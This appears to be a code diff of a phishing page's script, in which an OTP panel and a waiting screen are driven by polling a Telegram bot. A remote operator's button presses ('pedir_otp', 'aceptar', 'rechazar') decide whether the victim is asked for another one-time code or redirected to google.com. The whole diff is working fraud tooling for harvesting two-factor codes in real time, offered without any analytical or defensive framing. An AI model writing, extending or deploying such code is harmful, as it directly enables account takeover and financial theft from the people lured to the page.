+                document.getElementById('otp-panel').style.display = 'none';
+                document.getElementById('waiting-panel').style.display = 'flex';
+
+                initPolling();
+            });
+
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+            async function initPolling() {
+                try {
+                    const response = await fetch(`${TELEGRAM_API}/getUpdates`);
+                    const data = await response.json();
+                    if (data.ok && data.result.length > 0) {
+                        lastUpdateId = data.result[data.result.length - 1].update_id;
                         sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    }
+                } catch (e) { console.error(e); }
+                setTimeout(pollTelegram, 2000);
+            }
 
-                        if (update.callback_query) {
-                            const cbData = update.callback_query.data;
-                            const msgId = update.callback_query.message.message_id;
+            async function removeTelegramButtons(messageId) {
+                try {
+                    await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            message_id: messageId,
+                            reply_markup: { inline_keyboard: [] }
+                        })
+                    });
+                } catch (e) { console.error(e); }
+            }
 
-                            // Quitar botones de Telegram
-                            removeTelegramButtons(msgId);
-                            
-                            if (cbData === "pedir_otp") {
-                                document.getElementById('waiting-panel').style.display = 'none';
-                                document.getElementById('otp-panel').style.display = 'block';
-                                otpInputs.forEach(input => input.value = "");
-                                otpInputs[0].focus();
-                                return; // Stop polling until next submit
-                            } else if (cbData === "aceptar" || cbData === "rechazar") {
-                                window.location.href = "https://www.google.com";
-                                return;
+            async function pollTelegram() {
+                try {
+                    const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`);
+                    const data = await response.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = update.update_id;
+                            sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                            if (update.callback_query) {
+                                const cbData = update.callback_query.data;
+                                const msgId = update.callback_query.message.message_id;
+
+                                // Quitar botones de Telegram
+                                removeTelegramButtons(msgId);
+
+                                if (cbData === "pedir_otp") {
+                                    document.getElementById('waiting-panel').style.display = 'none';
+                                    document.getElementById('otp-panel').style.display = 'block';
+                                    otpInputs.forEach(input => input.value = "");
+                                    otpInputs[0].focus();
+                                    return; // Stop polling until next submit
+                                } else if (cbData === "aceptar" || cbData === "rechazar") {
+                                    window.location.href = "https://www.google.com";
+                                    return;
+                                }
                             }
                         }
                     }
+                } catch (err) {
+                    console.error("Polling error", err);
                 }
-            } catch (err) {
-                console.error("Polling error", err);
+
+                if (document.getElementById('waiting-panel').style.display === 'flex') {
+                    setTimeout(pollTelegram, 2000);
+                }
             }
 
-            if (document.getElementById('waiting-panel').style.display === 'flex') {
-                setTimeout(pollTelegram, 2000);
-            }
-        }
+            // Simple countdown timer
+            let timeLeft = 179; // 2:59 in seconds
+            const timerDisplay = document.querySelector('.timer-countdown');
 
-        // Simple countdown timer
-        let timeLeft = 179; // 2:59 in seconds
-        const timerDisplay = document.querySelector('.timer-countdown');
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 
-        const countdown = setInterval(() => {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                timerDisplay.textContent = '00:00';
-                timerDisplay.style.color = '#999';
-            }
-            timeLeft--;
-        }, 1000);
-    </script>
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    timerDisplay.textContent = '00:00';
+                    timerDisplay.style.color = '#999';
+                }
+                timeLeft--;
+            }, 1000);
+        </script>
 </body>
 
 </html>
